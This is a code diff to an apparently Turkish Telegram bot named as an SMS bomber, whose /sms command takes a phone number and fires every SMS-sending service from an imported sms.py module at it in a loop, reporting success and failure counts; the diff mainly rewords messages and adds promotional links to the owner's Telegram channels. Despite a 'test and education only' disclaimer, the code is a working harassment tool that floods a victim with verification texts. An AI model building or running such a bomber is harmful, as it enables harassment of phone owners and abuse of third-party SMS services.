@@ -1,6 +1,5 @@
-# telethon_smsbomber.py
-
 from telethon import TelegramClient, events
+from telethon.tl.custom import Button
 from sms import SendSms
 import asyncio
 from concurrent.futures import ThreadPoolExecutor
@@ -42,10 +41,19 @@ async def start_handler(event):
         "Bu bot, `sms.py` içindeki servislerle SMS bombardımanı yapar.\n\n"
         "**Komutlar:**\n"
         "📲 `/sms <telefon>` — Bombardımanı başlat\n"
-        "⛔ `/stop` — Durdur\n"
-        "ℹ️ `/help` — Yardım menüsü\n"
-        "🔧 `/servisler` — Toplam servis sayısı\n\n"
-        "_⚠️ Sadece test içindir, etik kurallara uyun._",
+        "⛔ `/stop` — Bombardımanı durdur\n"
+        "🔧 `/servisler` — Toplam servis sayısı\n"
+        "ℹ️ `/help` — Yardım menüsü\n\n"
+        "_⚠️ Bu araç yalnızca **test ve eğitim** amaçlıdır. Yasal sorumluluk kullanıcıya aittir._",
+        buttons=[
+            [
+                Button.url("👤 Owner", "https://t.me/ramazanozturk0"),
+                Button.url("📥 T.me/capiyedek", "https://t.me/capiyedek")
+            ],
+            [
+                Button.url("📢 Kanal: TurkUserBotKanali", "https://t.me/TurkUserBotKanali")
+            ]
+        ],
         parse_mode='markdown'
     )
 
@@ -57,10 +65,10 @@ async def start_handler(event):
 async def help_handler(event):
     await event.respond(
         "**📘 Yardım Menüsü**\n\n"
-        "`/sms <telefon>` — SMS bombardımanı başlatır\n"
-        "`/stop` — Aktif bombardımanı durdurur\n"
-        "`/servisler` — Toplam servisi gösterir\n"
-        "`/start` — Hoş geldin mesajı tekrar gösterir"
+        "🔹 `/sms <telefon>` → SMS bombardımanı başlatır\n"
+        "🔹 `/stop` → Aktif bombardımanı durdurur\n"
+        "🔹 `/servisler` → Servis sayısını gösterir\n"
+        "🔹 `/start` → Hoş geldin mesajını tekrar gösterir"
     )
 
 
@@ -74,7 +82,7 @@ async def service_count_handler(event):
         m for m in dir(SendSms)
         if callable(getattr(dummy, m)) and not m.startswith("__")
     ])
-    await event.respond(f"Mevcut servis sayısı: **{count}** adet", parse_mode='markdown')
+    await event.respond(f"🔧 Toplam aktif servis sayısı: **{count}** adet", parse_mode='markdown')
 
 
 # ——————————————————————
@@ -88,7 +96,7 @@ async def sms_handler(event):
     # Sayaçları sıfırla
     status_counts[user_id] = {"basarili": 0, "basarisiz": 0}
 
-    await event.respond(f"SMS gönderimi başlatılıyor: `0{phone}`", parse_mode='markdown')
+    await event.respond(f"📲 SMS gönderimi başlatılıyor: `0{phone}`", parse_mode='markdown')
     logging.info(f"{user_id} için gönderim başladı: 0{phone}")
 
     send_sms = SendSms(phone, "")
@@ -98,7 +106,7 @@ async def sms_handler(event):
         if callable(getattr(send_sms, fn)) and not fn.startswith("__")
     ]
 
-    status_msg = await event.respond("```\nSMS başlatılıyor...\n```")
+    status_msg = await event.respond("```\n🚀 SMS gönderimi başlatılıyor...\n```")
 
     async def spam():
         try:
@@ -118,10 +126,11 @@ async def sms_handler(event):
                 # Güncel metin
                 text = (
                     "```\n"
-                    "╔═══════════════════════╗\n"
-                    f"║   ✔ Başarılı:  {status_counts[user_id]['basarili']:>4}   ║\n"
-                    f"║   ❌ Başarısız: {status_counts[user_id]['basarisiz']:>4}   ║\n"
-                    "╚═══════════════════════╝\n```"
+                    "╔═════════════════════════╗\n"
+                    f"║ ✔ Başarılı : {status_counts[user_id]['basarili']:>5}     ║\n"
+                    f"║ ❌ Başarısız: {status_counts[user_id]['basarisiz']:>5}     ║\n"
+                    "╚═════════════════════════╝\n"
+                    f"🕐 Güncelleme: {datetime.now().strftime('%H:%M:%S')}\n```"
                 )
 
                 await status_msg.edit(text, parse_mode='markdown')
@@ -145,10 +154,10 @@ async def stop_handler(event):
     task = active_tasks.pop(user_id, None)
     if task:
         task.cancel()
-        await event.respond("⛔ SMS bombardımanı durduruldu.")
+        await event.respond("⛔ SMS bombardımanı başarıyla durduruldu.")
         logging.info(f"{user_id} bombardımanı durdurdu.")
     else:
-        await event.respond("❗ Hiçbir işlem aktif değil.")
+        await event.respond("❗ Şu anda çalışan bir işlem yok.")
 
 
 # ——————————————————————
